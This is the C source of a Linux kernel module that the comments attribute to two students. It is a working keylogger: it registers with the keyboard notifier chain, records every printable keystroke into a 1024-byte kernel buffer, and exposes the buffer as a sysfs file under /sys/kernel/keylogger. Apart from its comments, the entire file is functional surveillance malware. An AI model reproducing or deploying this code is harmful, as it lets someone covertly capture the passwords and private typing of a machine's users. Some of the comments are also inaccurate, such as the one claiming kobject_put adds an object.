/*
 * Roey Shushan - 312577919
 * Bar Pinian - 313347585
*/

#include <linux/kobject.h> // For using the Kobject.
#include <linux/module.h> // For the base of the module (init, exit, etc)
#include <linux/keyboard.h> // For using the keyboard notifier.
#include <linux/notifier.h> // For using the notifier block (as well as access to data structures).

#define BUFFER_SIZE 1024 // Constant to help us change easily the size of the input we would like to store.

static int data_attr; // Our attribute for the kobject (as well as the file name that contain the data [the characters]).
static char logged_key_buffer[BUFFER_SIZE];  // The buffer that meant to hold/save the logged keys.
static char *key_buffer_pointer = logged_key_buffer; // Our pointer to the buffer so if we want access to it - we will transfer the pointer.
static int keys_pressed(struct notifier_block *, unsigned long, void *); // Declaration of callback function for the notification chain (will be executed when an event will be occured).

int character_counter = 0;  // Counter of readed characters to avoid overflow in kernel space.

/* Our callback function for the notification chain. */
static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) 
{
	struct keyboard_notifier_param *param = data; // Initialization of our chain (aka list) within the input data.
	
	if (action == KBD_KEYSYM && param->down) // If the event (aka action) is type of KBD_KEYSYM (non-unicode character) and the key is pressed (aka down).
	{
		char c = param->value; // Initialization of "c" parameter to hold the pressed key value.
		
		if (c == 0x01) // If the pressed key is the start of header.
		{
			*(key_buffer_pointer++) = 0x0a; // Entering the buffer line feed.
			character_counter++; // Increasing our character counter in one since new input was detected.
		} 
		else if (c >= 0x20 && c < 0x7f) // Otherwise, if the pressed key is a character (symbol or a letter).
		{
			*(key_buffer_pointer++) = c; // Entering the buffer the received character.
			character_counter++; // Increasing our character counter in one since new input was detected.
		}
	
		if (character_counter >= BUFFER_SIZE) // If our character counter is greater than our buffer size (overflow situation).
		{
			character_counter = 0; // Zero our counter.
			memset(logged_key_buffer, 0, BUFFER_SIZE); // Re-allocating memory since the buffer overflow may crash the program.
			key_buffer_pointer = logged_key_buffer; // Re-initialize our buffer.
		}
	}	
	return NOTIFY_OK; // Returns "Notification was processed correctly".
}

/* The show ("read") function of our kobject attribute (data_attr). */
static ssize_t data_attr_show(struct kobject *kobj, struct kobj_attribute *attr,char *buf)
{
	return sprintf(buf, "%s\n", logged_key_buffer); // Transferring (copy) the data from our buffer to the entered buffer of the function (the buffer of the attribute).
}

/* The store ("write") function of our kobject attribute (data_attr). */
static ssize_t data_attr_store(struct kobject *kobj, struct kobj_attribute *attr,const char *buf, size_t count)
{
	int ret; // Integer variable to represent the success or failure of the writing.

	ret = kstrtoint(buf, 10, &data_attr); // Reading from the buffer and puts it into the variable (the data_atrr).
	if (ret < 0) // If error has occurred.
	{
		return ret; // Returns the error signed (integer presentation of the error).
	}
	return count; // If the write went successfully we return the count.
}

static struct kobj_attribute data_attr_attribute = __ATTR(data_attr, 0664, data_attr_show, data_attr_store); // Macro initialization for the kobject attribute (with their needed).
static struct attribute *attrs[] = {&data_attr_attribute.attr,NULL,}; // Array that holds the kobject attributes (needed NULL in the end to terminate the list of attributes).
static struct attribute_group attr_group = {.attrs = attrs,}; // Macro initialization for the kobject attribute group.
static struct notifier_block nb = {.notifier_call = keys_pressed}; // Macro initialization for notifier_block.
static struct kobject *keylogger; // Declaration of our keylogger kobject.

/* Driver initialization entry point. */
static int __init keylogger_init(void)
{
	int retval; // Integer indicator for our kobject group creation.
	
	register_keyboard_notifier(&nb); // Registering the notification block (notification chain) to the keyboard notification chain.
	memset(logged_key_buffer, 0, BUFFER_SIZE); // Resetting the buffer.
	
	keylogger = kobject_create_and_add("keylogger", kernel_kobj); // Create a kobject with the name of "keylogger", located under /sys/kernel/keylogger.
	if (!keylogger) // If the kobject was not created successfully.
	{
		return -ENOMEM; // Returning insufficient memory error.
	}

	retval = sysfs_create_group(keylogger, &attr_group); // Creating a group where we connect between our "keylogger" kobject to the attribute group.
	if (retval) // If the group creation succeeded.
	{
		kobject_put(keylogger); // Adding another kobject to the system (as well as decrement refcount for the object).
	}
	
	return retval; // Returning the integer value of the group creation.
}

/* Driver exit entry point. */
static void __exit keylogger_exit(void)
{
	unregister_keyboard_notifier(&nb); // Releasing our notifier block (the notification chain) from the keyboard notification chain.
	kobject_put(keylogger); // Releasing the kobject (keylogger).
}

module_init(keylogger_init); // Our driver initialization entry point.
module_exit(keylogger_exit); // our driver exit entry point
MODULE_LICENSE("GPL v2"); // The license of our driver.
MODULE_AUTHOR("Roey Shushan and Bar Pinian."); // Students names.
MODULE_DESCRIPTION("Keylogger driver using kobject and external program."); // Short description of the driver.
MODULE_VERSION("0.1.2"); // Our Versions tracker.
